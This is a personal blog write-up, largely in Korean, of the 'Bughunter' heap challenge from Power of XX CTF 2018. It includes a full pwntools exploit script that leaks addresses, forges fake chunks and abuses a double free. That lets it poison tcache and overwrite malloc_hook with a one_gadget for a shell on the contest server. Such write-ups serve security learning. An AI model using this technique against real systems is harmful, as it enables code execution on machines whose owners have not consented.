---
title: Power of XX CTF 2018 - Bughunter
date: 2018-10-24 14:19:53
categories:
- Heap Exploit
- CTF write up
tags:
- Tcache Poisoning
---


```c
Your name : wally0813
Hello, wally0813 bughunter!
You have a Money : 10000, efficiency : 10000
1. Bank
2. Shop
3. Work
4. exit
>> 
```

![kakaotalk_20181015_014246706](https://user-images.githubusercontent.com/36659181/47423916-4c167400-d7c1-11e8-99dc-d5d138286a55.png)

예선 3등!ㅎㅎ 본선간다! 본선 못가면 한강갈꺼라고 했는데 진짜 갈뻔했다.. 

예선에서 포너블 5개랑 코딩문제 하나 풀었는데 버그헌터가 제일 재밌어서 라이트업 쓴당ㅎㅎ 2주전이라 기억이 가물가물하다..

그래도 포너블 문제가 다 아는 범위안에서 나와서 다행이였다. 너무 조급하게 풀어서 실수한 것도 많고 생각보다 더 잘 안풀리는 것도 있었다ㅠㅠ 앞으로는 차근차근 풀어야지..



```python
from pwn import *
from time import *

#w = process("./bughunter")
w = remote("54.180.93.73",7777)

def create(address,password):
    w.sendlineafter(">>","1")
    w.sendlineafter(":",address)
    w.sendlineafter(":",password)
    
def delete(idx,address,password):
    w.sendlineafter(">>","2")
    w.sendlineafter(":",str(idx))
    w.sendlineafter(":",address)
    w.sendlineafter(":",password)
    
def leak_h():
    w.sendlineafter(">>","3")
    w.recvuntil("address : ")
    heap = u64(("\x00"+w.recv(6)[1:]).ljust(8,"\x00"))
    return heap

def leak_l():
    w.recvuntil("address : "+"8"*8)
    libc = u64((w.recv(6)).ljust(8,"\x00"))
    return libc

def leak_c():
    w.recvuntil("password : "+"a"*8)
    code = u64((w.recv(6)).ljust(8,"\x00"))
    return code

w.sendlineafter(":","w"*20)

for i in range(0,10):
    for i in range(0,10):
        print i
        w.sendlineafter(">>","3")
        sleep(0.1)
    for i in range(0,10):
        w.sendlineafter(">>","2")
        w.sendlineafter(">>","1")
        w.sendlineafter(":","1")
for i in range(0,40):
    w.sendlineafter(">>","3")
    sleep(0.1)
    
w.sendlineafter(">>","2")
w.sendlineafter(">>","5")
w.sendlineafter(":","30")
w.sendlineafter(">>","1")

for i in range(1,15):
    create(str(i),str(i))
for i in range(1,15):
    delete(i,str(i),str(i))
for i in range(1,15):
    if i == 8:
        create("8"*8,"8"*8)
    if i == 13:
        create("a"*8,"a"*8)
    else:
        create(str(i),str(i))
        
hh = (leak_h() - 0x1500) & 0xfffffffffffff000
ll = leak_l() - 0x3ebca0
cc = leak_c() - 0x1390

log.info("code:: "+hex(cc))
log.info("heap:: "+hex(hh))
log.info("libc:: "+hex(ll))

pay = p64(0)+p64(0x31)
pay += p64(hh+0x2880)+p64(hh+0x28b0)
pay += "w"*0x20
pay += p64(0)+p64(0x31)
pay += "w"*0x20
pay += p64(0)+p64(0x31)
pay += "w"*0x20

create(pay,"w")

want = ((hh+0x2810) - (cc+0x1060))/8
delete(30,str(14),str(14))
delete(want,str(14),str(14))

one = [0x4f2c5, 0x4f322, 0x10a38c]
malloc_hook = ll + 0x3ebc30
pay = p64(malloc_hook)*2
create(pay,"ww")
create("ww","ww")
create(p64(ll+one[2]),p64(ll+one[2]))

w.interactive()

```

익스 알고리즘이 진짜 똥이다ㅎㅎ.. 

main에 다른 메뉴들이 왜 있나 했더니 tcache 때문이엿다. 

how2heap tcache 검색하자마자 데몬팀 블로그 나와서 이거다 싶었다. 

 tcache 때문에 돈을 불려서 계좌를 사야한다. 대강 work랑 shop 여러번 돌려서 30개를 샀다.

tcache는 7개까지 들어가고 그 후엔 일반 bins들과 똑같이 관리되기 때문에 여러 개를 할당해서 leak 해줘야한다.

이걸 이용해 name을 heap에 저장해서 bss 영역까지 leak 할 수 있다.



취약점 찾는거에서 엄청 삽질을 했는데 별거 아닌 곳에 있었다.. 등잔 밑이 어둡다고.. 잘봐야한다...ㅜㅠ

```c
  v0 = check(1LL, &v2);
  v3 = v0;
  if ( v0 )
  {
    if ( list[v2] )
    {
      free(list[v2]);
      free(list[v2]->address);
      free(list[v2]->password);
      list[v2] = 0LL;
      puts("complete!");
    }
```

여기에 취약점이 있다. 리버싱 꼼꼼히 하자..ㅠㅠ

index 맘대로 할당해서 원하는 곳을 free 할 수 있으니 bss 영역을 찾아보자 했는데 free 한건 모두 0으로 초기화 시켜버려서 못한다.

어떻게 하지 생각하다가 index를 엄청 크게줘서 heap 영역에 접근하는 걸 생각했다. 

근데 이게 free 할 때 그냥 free 해 버리면 0이 넣어지는데 이게 address 중복 체크할 때 eof 에러나서 정상적으로 free 해주고 하던가 주소를 일일히 적어주던가 해야하는데 귀찮아서 그냥 전자로 fake chunk를 만들었다.

더 자세하게 적으면 맨 마지막 account를 free 하고 free한 account의 address 부분을 free해준다. 근데 이때 free할 영역의 0x10, 0x18부분에도 chunk 주소가 있어야 한다. 맨 마지막 account create할 때 fake chunk를 만들어 줬다. 이러면 double free bug 가 나고 다시 create 하고 fd 부분에 malloc_hook 주소를 적어준다. 그러면 다 다음 malloc 할 때 이 fd 부분으로 malloc을 하게 됨. 짜잔. 데몬팀 블로그에 tcache poisoning이 적혀있길래 그냥 바로 이걸로 익스했다. 사실 익스하는 법은 fastbin dup이랑 똑같다. 

이 문제 이후로 tcache 엄청 많이 봤다...
